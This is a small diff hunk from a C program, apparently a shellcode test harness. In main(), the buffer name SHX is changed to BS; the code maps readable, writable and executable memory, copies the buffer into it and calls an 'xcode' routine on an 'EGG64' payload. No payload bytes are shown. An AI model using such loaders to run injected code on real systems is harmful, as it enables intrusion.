@@ -165,14 +165,14 @@ void xcode(char *s, int len)
 
 int main(int argc, char *argv[])
 {
-  uint8_t *sc=(uint8_t*)mmap (0, sizeof(SHX), 
+  uint8_t *sc=(uint8_t*)mmap (0, sizeof(BS), 
       PROT_EXEC | PROT_WRITE | PROT_READ, 
       MAP_ANON  | MAP_PRIVATE, -1, 0); 
       
   if (sc != NULL) {
-    memcpy (sc, SHX, sizeof(SHX));    
+    memcpy (sc, BS, sizeof(BS));    
     xcode (EGG64, EGG64_SIZE);
-    munmap((void*)sc, sizeof(SHX));
+    munmap((void*)sc, sizeof(BS));
   }
   return 0;  
 }
